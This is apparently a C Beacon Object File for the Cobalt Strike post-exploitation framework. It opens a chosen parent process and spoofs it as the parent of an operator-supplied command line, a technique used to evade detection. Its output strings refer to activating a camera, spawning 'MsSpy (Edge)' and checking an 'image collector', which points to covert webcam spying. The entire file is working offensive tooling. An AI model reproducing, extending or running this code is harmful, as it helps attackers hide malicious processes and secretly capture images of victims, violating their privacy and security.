#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include "beacon.h"

DECLSPEC_IMPORT int SHLWAPI$StrToIntA(
    PCSTR pszSrc
);

DECLSPEC_IMPORT DWORD KERNEL32$CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFO        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);


DECLSPEC_IMPORT HANDLE  KERNEL32$CreateToolhelp32Snapshot(
    DWORD dwFlags,
    DWORD th32ProcessID
);

DECLSPEC_IMPORT BOOL KERNEL32$Process32First(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);

DECLSPEC_IMPORT BOOL KERNEL32$Process32Next(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);

DECLSPEC_IMPORT BOOL KERNEL32$InitializeProcThreadAttributeList(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD                        dwAttributeCount,
    DWORD                        dwFlags,
    PSIZE_T                      lpSize
);

DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

DECLSPEC_IMPORT BOOL KERNEL32$UpdateProcThreadAttribute(
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    DWORD                        dwFlags,
    DWORD_PTR                    Attribute,
    PVOID                        lpValue,
    SIZE_T                       cbSize,
    PVOID                        lpPreviousValue,
    PSIZE_T                      lpReturnSize
);

DECLSPEC_IMPORT LPVOID KERNEL32$VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();


BOOL StartCamera(IN PDWORD pPID, IN DWORD PPID, IN LPSTR Payload)
{

    HANDLE hPPID = NULL;
    
    hPPID = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, PPID);

    if (hPPID == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess failed with error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }


    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);


    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    SIZE_T szAttrList = 0;

    KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &szAttrList);

    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$VirtualAlloc(NULL, szAttrList, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    if (pThreadAttList == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed with error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!KERNEL32$InitializeProcThreadAttributeList(pThreadAttList, 1, 0, &szAttrList))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed with error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    if (!KERNEL32$UpdateProcThreadAttribute(
        pThreadAttList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hPPID,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        BeaconPrintf(CALLBACK_ERROR, "[!] UpdateProcThreadAttribute failed with error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    SiEx.lpAttributeList = pThreadAttList;

    if (!KERNEL32$CreateProcessA(
        NULL,
        Payload,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &SiEx.StartupInfo,
        &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateProcessA failed with error code: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }

    *pPID = pi.dwProcessId;
    return TRUE;

}

void go(char* args, int argc) {

    datap Parser = { 0 };
    DWORD PPID = 0;
    DWORD PID = 0;
    LPSTR Payload;
    int PayloadLen = 0;

    /* Initialize the argument buffer for parsing */
    BeaconDataParse(&Parser, args, argc);

    Payload = BeaconDataExtract(&Parser, &PayloadLen);
    PPID = BeaconDataInt(&Parser);


    if (PPID < 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid PPID, must be greater than zero!\n");
        return;
    }

    if (StartCamera(&PID, PPID, Payload) == FALSE)
    {
        BeaconPrintf(CALLBACK_ERROR, "FAILED activating camera\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Spawned MsSpy (Edge) with PID: %d\nCheck your image collector!\n", PID);

    return;

}
